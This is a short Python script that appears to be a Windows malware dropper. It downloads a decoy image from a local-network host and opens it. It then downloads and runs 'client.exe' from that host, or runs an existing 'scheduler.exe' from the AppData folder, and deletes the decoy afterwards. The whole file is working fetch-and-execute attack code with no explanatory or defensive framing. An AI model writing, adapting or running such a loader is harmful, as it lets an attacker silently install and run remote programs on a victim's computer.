import requests
import subprocess
import os
import tempfile

def download(url):
    response = requests.get(url)
    name = url.split("/")
    name = name[len(name)-1]
    fobj = open(name, 'wb')
    fobj.write(response.content)
    fobj.close

temp_dir = tempfile.gettempdir()
os.chdir(temp_dir)

download('http://192.168.1.39:8000/image.png')
subprocess.call('image.png',shell=True)
#subprocess.Popen allows the following commands in the code to run as well

location = os.environ["appdata"]+"\\scheduler.exe"
if not os.path.exists(location):
    download('http://192.168.1.39:8000/client.exe')
    subprocess.call('client.exe',shell=True)
else:
    os.chdir(os.environ['appdata'])
    subprocess.call('scheduler.exe',shell=True)

os.chdir(temp_dir)
os.remove('image.png')
